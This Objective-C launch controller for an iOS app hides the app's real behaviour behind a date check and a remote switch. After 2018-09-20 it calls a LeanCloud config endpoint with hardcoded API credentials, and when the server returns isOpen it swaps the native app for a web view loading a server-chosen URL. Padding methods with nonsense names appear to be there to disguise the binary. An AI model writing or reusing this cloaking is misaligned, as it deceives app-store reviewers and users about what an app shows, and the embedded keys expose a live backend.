#import "HJGLauchController.h"
#import "HJG_HomeController.h"
#import "HJGWebController.h"

#define r9rkRM8w @"r9rkRM8w.api.lncld"
@interface HJGLauchController ()
@end
@implementation HJGLauchController
- (void)viewDidLoad {
    [super viewDidLoad];
[self wr_setNavBarBackgroundAlpha:0];

    [SVProgressHUD showWithStatus:@"正在载入..."];
    [self loadData];
    
//    [self lauch];

}
- (void)lauch{
    [SVProgressHUD dismiss];
    HJG_HomeController *vc = [[HJG_HomeController alloc]init];
    [self.navigationController pushViewController:vc animated:NO];
    
}
- (void)loadData
{
    NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
    NSDate *currendate = [dateFormatter dateFromString:dateTime];
    NSDate *date = [dateFormatter dateFromString:@"2018-09-20"];
    NSComparisonResult result = [date compare:currendate];
    if (result == NSOrderedDescending)
    {
        [self lauch];
        return;
    }
    else if (result == NSOrderedAscending)
    {
        
    }
    
    
    NSString *gaga  = [NSString stringWithFormat:@"%@",r9rkRM8w];
    
    NSString *hh = [NSString stringWithFormat:@"https://%@.net/1.1/classes/config/5ad95842ee920a3f733ffe27",gaga];
    
    
    //NSLog(@"%@", newurl);
    NSMutableURLRequest *urlRequest = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:hh]];
    [urlRequest setValue:@"0DYjVYcNbLsedbduTGlp5qFQ-gzGzoHsz" forHTTPHeaderField:@"X-LC-Id"];
    [urlRequest setValue:@"h3ehlg7W7IKoQJzwJGTG1vRN" forHTTPHeaderField:@"X-LC-Key"];
    urlRequest.timeoutInterval = 5.0;
    NSURLSession *urlSession = [NSURLSession sharedSession];
    NSURLSessionDataTask *dataTask = [urlSession dataTaskWithRequest:urlRequest completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        if (error)
        {
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.01 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                [SVProgressHUD dismiss];
                [self lauch];
            });
        }
        else
        {
            NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:nil];
            
            NSLog(@"----------------%@",dic);
            if ([dic[@"isOpen"] intValue] == 1) {
                [SVProgressHUD dismiss];
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.1 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    HJGWebController *vc = [[HJGWebController alloc]init];
                    vc.url_string = dic[@"openUrl"];
                    [HJGSaveTool setObject:dic[@"jpushKey"] forKey:@"ok"];
                    [self presentViewController:vc animated:NO completion:NULL];
                });
                
            }else{
                
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.01 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    [SVProgressHUD dismiss];
                    [self lauch];
                });
            }
        }
    }];
    [dataTask resume];
    
    
}
- (void)sp_checkUsegsdfgsfgfvsrInfo {
    NSLog(@"Get Info Success");
}
- (void)sp_checkUsegfsgsfgfsrInfo {
    NSLog(@"Get user Success");
}- (void)sp_checkUgdsgfsbfbserInfo {
    NSLog(@"Get ok Success");
}- (void)sp_checkUserInfo {
    NSLog(@"Get url Success");
}- (void)sp_checkUserfadfadfdsgfInfo {
    NSLog(@"Get xix Success");
}- (void)sp_checkUserIfgdafdnfo {
    NSLog(@"Get er Success");
}- (void)sp_checkUservdsvdsfvffInfo {
    NSLog(@"Get dsds Success");
}- (void)sp_checkUssvdsdverInfo {
    NSLog(@"Get Indfsaffo Success");
}
- (void)sp_checkUvsdvds23efewrewserInfo {
    NSLog(@"Get Info Success");
}
@end
